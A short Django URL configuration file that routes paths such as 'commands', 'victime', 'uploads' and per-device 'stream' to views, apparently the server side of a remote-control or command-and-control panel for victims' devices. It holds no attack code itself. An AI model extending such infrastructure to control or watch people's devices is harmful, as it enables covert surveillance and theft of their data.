from django.urls import path
from .views import *

urlpatterns = [
    path('network/', Network.as_view()),
    path('commands/', Control.as_view()),
    path('log/', LogView.as_view()),
    path('victime/', VictimeView.as_view()),
    path('states/', StatesView.as_view()),
    path('uploads/', UploadView.as_view()),
    path('upload_stream/', UploadStreamView.as_view(), name='upload_stream'),
    path('music/', MusicView.as_view()),
    path('stream/<str:device_name>/', StreamView.as_view(), name='stream_view'),
]